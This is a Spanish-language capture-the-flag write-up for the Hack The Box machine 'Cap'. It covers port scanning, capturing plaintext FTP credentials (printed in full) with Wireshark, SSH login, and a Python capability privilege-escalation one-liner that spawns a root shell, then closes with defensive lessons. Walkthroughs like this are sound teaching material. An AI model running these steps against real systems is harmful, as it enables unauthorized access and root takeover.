# hackthebox-cap
# 🛠️ Guía de Explotación - Máquina 10.129.37.59

## 🔍 1. Enumeración inicial

Se realiza un escaneo completo de puertos con Nmap:

``` bash
sudo nmap -p- --open -sCVS -n -Pn -vvv --script vuln -oN escaneo 10.129.37.59
```

### 📌 Explicación de parámetros:

-   `-p-` → Escanea todos los puertos (1-65535)
-   `--open` → Muestra solo puertos abiertos
-   `-sC` → Ejecuta scripts básicos de Nmap
-   `-sV` → Detecta versiones de servicios
-   `-sS` → Escaneo SYN (sigiloso)
-   `-n` → No resuelve DNS (más rápido)
-   `-Pn` → Omite detección de host activo
-   `-vvv` → Máxima verbosidad
-   `--script vuln` → Ejecuta scripts de vulnerabilidades
-   `-oN escaneo` → Guarda resultados en archivo

## 📊 Resultados

    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
    80/tcp open  http    Gunicorn

## 🌐 2. Enumeración Web

http://10.129.37.59/data/0

🔎 Observación:

Posible endpoint accesible sin autenticación
Puede contener archivos o rutas interesantes

## 📡 3. Captura de credenciales (Wireshark)

Se detecta tráfico FTP sin cifrar, lo que permite capturar credenciales:

🔐 Credenciales encontradas:
-  Usuario: nathan
-  Contraseña: Buck3tH4TF0RM3!

⚠️ Explicación:

El protocolo FTP transmite credenciales en texto plano, lo que permite interceptarlas fácilmente con herramientas como Wireshark.

## 🔑 4. Acceso inicial (SSH)

Se accede al sistema usando las credenciales obtenidas:

``` bash
ssh nathan@10.129.37.59
```

## 🧠 5. Enumeración de privilegios

🔍 Verificar permisos sudo:
``` bash
sudo -l
```

🔍 Buscar binarios con capacidades especiales:
``` bash
getcap -r / 2>/dev/null
```

## ⚡ 6. Escalada de privilegios

Se identifica que Python tiene capacidades especiales, lo que permite escalar privilegios.

📚 Referencia:

https://gtfobins.org/gtfobins/python/#library-load

🚀 Exploit:

``` bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

🧠 Explicación:
-  os.setuid(0) → Cambia el UID a root
-  os.system("/bin/bash") → Ejecuta una shell como root
  
## 🏁 7. Captura de flags

👤 User flag:
``` bash
find / -name user.txt 2>/dev/null
``` 
``` bash
/home/nathan/user.txt
```

👑 Root flag:

``` bash
find / -name root.txt 2>/dev/null
``` 
``` bash
/root/root.txt
``` 

## 🧾 Conclusión

🔓 Vector de ataque:

- Enumeración de servicios expuestos
- Intercepción de credenciales FTP (texto plano)
- Acceso por SSH
- Escalada de privilegios mediante capacidades en Python

⚠️ Lecciones aprendidas:

- Evitar uso de FTP sin cifrado
- Revisar capacidades asignadas a binarios (getcap)
- Limitar accesos y privilegios innecesarios
- Implementar monitoreo de tráfico de red

🧰 Herramientas utilizadas

- Nmap
- Wireshark
- SSH
- GTFOBins

